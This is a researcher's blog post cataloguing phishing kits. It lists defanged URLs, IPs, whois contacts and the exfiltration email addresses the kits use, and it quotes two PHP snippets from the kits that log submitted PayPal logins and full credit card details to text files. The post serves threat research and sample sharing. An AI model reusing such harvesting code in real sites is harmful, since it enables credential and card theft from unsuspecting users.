# Crap I Found On The Internet (2020/10/13)

Hey folks, here's another mini-update, this time with some more kits i found when combing through more domains. First, i'll have a table with the hosting information and whatnot, then below that will be a block of text with the sha256 hashes of the zip files in question.

I acquired these kits earlier in the day, so by the time i was off work and had time to go get the IP addresses and whois data and all that, some had stopped resolving (okay, one or two), but i managed to get what i could on those using dig and riskIQ. 

| URL                                                                                      | IP                    | Whois/SOA                            | Exfil                                                         |
| ---------------------------------------------------------------------------------------- | --------------------- | ------------------------------------ | ------------------------------------------------------------- |
| boatbookings[.]xyz/ExRobotos-OfficeV4-2020%20(1)[.]zip                                   | 111[.]90[.]150[.]71   | hostmaster@registrar-servers[.]com   | Unconfigured                                                  |
| central-14345456478834345343[.]gq/CC_LOGIN%20(1)[.]zip                                   | 101[.]50[.]1[.]53     | soa@freenom[.]com                    | Writes to text file\*                                         |
| central-14345456478834345344[.]gq/CC_LOGIN%20(1)[.]zip                                   | 101[.]50[.]1[.]53     | soa@freenom[.]com                    | Writes to text file\*                                         |
| chat[.]whastapp[.]frontalgaming[.]frontal-gaming1[.]my[.]id/Wa18Fans_FrontalGaming[.]zip | 207[.]180[.]252[.]85  | fauziponcol21@gmail[.]com            | jokergila301@gmail[.]com                                      |
| diamondgratis[.]eventfreefirenew1[.]ml/SC-DIAMOND-LEVEL-1[.]zip                          | 95[.]111[.]241[.]149  | N/A                                  | emailkalian@gmail[.]com                                       |
| evant-freefire[.]neww[.]my[.]id/DIAMOND%20FF%20GG%5BDIT%20SANTUY%5D-1[.]zip              | 192[.]210[.]219[.]168 | admin@nemesis-hostlive[.]my[.]id     | pakeemaillo@gmail[.]com                                       |
| facebookhelpcheckpoint[.]my[.]id/cgi-bin[.]zip                                           | 95[.]111[.]241[.]149  | N/A                                  | ggmild933@gmail[.]com                                         |
| join-grup[.]wa[.]buggg-eventss[.]cf/fake-login-facebook[.]zip                            | 62[.]77[.]159[.]72    | root@2zfq[.]c[.]serverhost[.]name    | Unconfigured                                                  |
| lju98[.]winaccesssecuredexxr[.]xyz/ANSUSA27julsouupdated[.]zip                           | 142[.]4[.]3[.]120     | dns@hostinger[.]com                  | none, phone number 08004049735                                |
| navadalandlop[.]xyz/godaddy%20firebase%20setup[.]zip                                     | 93[.]157[.]63[.]185   | root@root[.]com                      | logpaul895@yandex[.]com<br/>02londonsex@gmail[.]com           |
| navadalandlop[.]xyz/owa/goowa[.]zip                                                      | 93[.]157[.]63[.]185   | root@root[.]com                      | logpaul895@yandex[.]com<br/>02londonsex@gmail[.]com           |
| realrespond[.]ga/cf/Ourtime%20(2)[.]zip                                                  | 13[.]68[.]158[.]118   | soa@freenom[.]com                    | maryronda7@gmail[.]com                                        |
| realrespond[.]ga/dc/Ourtime%20(2)[.]zip                                                  | 13[.]68[.]158[.]118   | soa@freenom[.]com                    | maryronda7@gmail[.]com                                        |
| reeldealyachts[.]xyz/ExRobotos-Redirect-v4-2020%20(1)[.]zip                              | 111[.]90[.]150[.]71   | N/A                                  | N/A (just a redirection script)                               |
| sdffgewr[.]cf/amaz[.]zip                                                                 | 185[.]221[.]216[.]4   | markusm122@yahoo[.]com               | collinshofmann@outlook[.]com<br/>castilloalphonso@gmail[.]com |
| sdffgewr[.]ml/amaz[.]zip                                                                 | 185[.]221[.]216[.]4   | markusm122@yahoo[.]com               | collinshofmann@outlook[.]com<br/>castilloalphonso@gmail[.]com |
| servicefax1[.]tk/365/redirect[.]zip                                                      | 103[.]153[.]182[.]126 | root@103-153-182-126[.]cprapid[.]com | N/A (just a redirection script)                               |
| terta-71[.]cf/wells/Wells[.]zip                                                          | 162[.]241[.]117[.]240 | soa@freenom[.]com                    | jim6601@outlook[.]com<br/>speaker6692@gmail[.]com             |

#### * writes to either `____________PAYPAL_________.txt` or `___________________________C^C________________________.txt` (see below)

```
# log4.php
$file = "____________PAYPAL_________.txt";
$paypalmail = $_POST['paypalmail'];
$pwpaypal = $_POST['pwpaypal'];
$ip = $_SERVER['REMOTE_ADDR'];


$handle = fopen($file, 'a');
fwrite($handle, "xxxxPAYPALxxxx");
fwrite($handle, "\n");
fwrite($handle, "::  EMAIL     ::   ");
fwrite($handle, "$paypalmail");
fwrite($handle, "\n");
fwrite($handle, "::  PASS      ::   ");
fwrite($handle, "$pwpaypal");
fwrite($handle, "\n");
fwrite($handle, "::  IP        ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "xxxxPAYPALxxxx");
fwrite($handle, "\n");
fclose($handle);
```

```
# log2.php & log3.php:
$file = "___________________________C^C________________________.txt";
$firstName = $_POST['firstName'];
$creditCardNumber = $_POST['creditCardNumber'];
$month = $_POST['month'];
$year = $_POST['year'];
$csc = $_POST['csc'];
$street = $_POST['street'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
fwrite($handle, "\n");
fwrite($handle, "::  NAMA      ::   ");
fwrite($handle, "$firstName");
fwrite($handle, "\n");
fwrite($handle, "::  CREDIT    ::   ");
fwrite($handle, "$creditCardNumber");
fwrite($handle, "\n");
fwrite($handle, "::  BULAN     ::   ");
fwrite($handle, "$month");
fwrite($handle, "\n");
fwrite($handle, "::  TAHUN     ::   ");
fwrite($handle, "$year");
fwrite($handle, "\n");
fwrite($handle, "::  CSC       ::   ");
fwrite($handle, "$csc");
fwrite($handle, "\n");
fwrite($handle, "::  POS       ::   ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA    ::   ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "::  IP        ::   ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
```

Going to work on getting the samples uploaded to [malshare](https://malshare.com) for researchers to take a look if they want (since not everyone can afford virustotal enterprise)

[Return to index](/)
